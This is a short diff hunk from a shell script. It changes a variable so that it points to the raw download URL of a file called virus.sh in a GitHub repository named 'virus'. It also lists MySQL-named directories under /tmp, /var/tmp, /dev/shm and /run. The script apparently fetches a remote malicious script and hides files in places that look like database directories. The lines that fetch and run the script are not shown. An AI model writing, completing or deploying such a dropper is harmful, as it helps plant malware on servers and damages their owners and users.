@@ -1,4 +1,4 @@
-GITHUB_SCRIPT_URL="https://github.com/Zend1X/virus/blob/main/virus.sh"
+GITHUB_SCRIPT_URL="https://raw.githubusercontent.com/Zend1X/virus/main/virus.sh"
 MYSQL_DIRS=("/tmp/mysql" "/var/tmp/mysql" "/dev/shm/mysql" "/run/mysqld" "/var/lib/mysql")
 
 # Цвета для вывода
